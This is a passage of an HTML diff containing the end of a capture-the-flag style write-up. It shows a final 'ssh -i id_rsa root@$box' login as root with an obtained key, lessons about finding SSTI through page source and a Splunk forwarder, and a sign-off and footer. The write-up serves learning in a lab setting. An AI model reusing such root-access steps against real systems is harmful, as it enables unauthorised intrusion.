+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="ssh%20-i%20id_rsa%20root@$box">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ssh -i id_rsa root@$box</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<figure><img src="/ox-hugo/2024-12-21-081007_.png">
+</figure>
+
+</li>
+</ul>
+<h2 id="lessons-learned">Lessons Learned:</h2>
+<h3 id="what-did-i-learn">What did I learn?</h3>
+<ol>
+<li>This took my way longer to complete than I would have liked. Web is currently my weakest area so I am making a concerted effort to do these types of boxes and challenges in order to improve my web weaknesses.</li>
+<li>I learned to always look at source code even if the page appears empty or unimportant. As two key pieces of information were found this way.
+<ol>
+<li>The initial <code>html</code> comment regarding <code>/archive</code> on the message upload page.</li>
+<li>The xml contents of the <code>/archive</code> page itself which provided the foothold as we were able to fuzz for SSTI.</li>
+</ol>
+</li>
+<li>I also learned I am going to grind these like I did AD boxes to improve. Doing lots of AD boxes really helped me get better and dial in.</li>
+</ol>
+<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
+<ol>
+<li>I tried for a long time to connect to Splunks Universal Forwarder with HTTP, instead of HTTPS that wasted a good few mins.</li>
+<li>I had a moment where my brain was fried when figuring out cron syntax, luckily this exists <a href="https://cron.help">https://cron.help</a></li>
+</ol>
+<h2 id="sign-off">Sign off:</h2>
+<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
+<p>Until next time, hack the planet!</p>
+<p>– Bloodstiller</p>
+<p>– Get in touch bloodstiller at bloodstiller dot com</p>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        2633
+                    
+                </li>
+            
+
+
+            
+                <li>en</li>
+            
+
+            
+
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Dec 21 2024 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
